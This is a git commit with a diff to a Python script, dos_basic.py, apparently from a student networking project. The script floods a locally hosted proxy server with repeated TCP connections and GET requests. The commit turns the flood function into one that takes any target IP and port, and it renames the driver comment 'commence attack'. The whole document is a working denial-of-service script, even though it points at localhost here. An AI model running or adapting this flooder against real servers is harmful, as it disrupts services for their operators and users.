b10e66b07b4c41b6ff5cb9b33e5c78b36d9a518e
Joshua <joshgw@uw.edu>
2020-03-15 17:38:42 -0700

    Cleaned up code  a little

--- dos_basic.py
+++ dos_basic.py
@@ -2,18 +2,20 @@
 # Opens a bunch of TCP connections to proxy server
 # and sends simple GET request and immediately closes
 
-import socket, sys, os
+import socket, sys
+
 print ("[ Attacking locally hosted proxy server ]")
-def flood():
+
+def flood(target_IP, dst_port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-    s.connect(("localhost", 1234)) 
+    s.connect((target_IP, dst_port)) 
     str1 = "GET /apache HTTP/1.1\r\n"
     print (">> GET /apache HTTP/1.1")
     s.send(str1.encode()) 
-    str2 = "Host: localhost\r\n\r\n"
+    str2 = "Host: " + target_IP + "\r\n\r\n"
     s.send(str2.encode()); 
     s.close() 
 
-# Driver code 
+# commence attack 
 while (True): 
-    flood()
+    flood("localhost", 1234)
